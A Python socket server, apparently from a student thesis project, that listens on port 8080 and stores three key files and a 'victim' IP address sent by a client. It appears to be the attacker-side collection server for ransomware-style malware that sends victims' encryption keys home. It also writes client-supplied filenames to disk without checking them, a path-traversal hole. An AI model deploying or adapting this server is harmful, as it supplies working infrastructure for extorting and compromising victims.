import socket
import os

with open("/home/tfg/server/server_ip.txt", "r") as f:
        IP = f.read()

PORT = 8080
ADDR = (IP, PORT)

def server():
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(ADDR)
        server.listen()

        conn, addr = server.accept()

        filename1 = conn.recv(1024).decode()
        path1 = os.path.join("/home/tfg/server/Fase4/keys", filename1)
        with open(path1, "wb") as f:
                data1 = conn.recv(3096)
                f.write(data1)
        
        filename2 = conn.recv(1024).decode()
        path2 = os.path.join("/home/tfg/server/Fase4/keys", filename2)
        with open(path2, "wb") as f:
                data2 = conn.recv(3096)
                f.write(data2)  
        
        filename3 = conn.recv(1024).decode()
        path3 = os.path.join("/home/tfg/server/Fase4/keys", filename3)
        with open(path3, "wb") as f:
                data3 = conn.recv(1024)
                f.write(data3)

        victim_file_name =  conn.recv(1024).decode()
        victim_path = os.path.join("/home/tfg/server/Fase4", victim_file_name)
        with open(victim_path, "w") as f:
                victim_ip = conn.recv(1024)
                f.write(victim_ip.decode())


        conn.close()

if __name__ == '__main__':
        server()
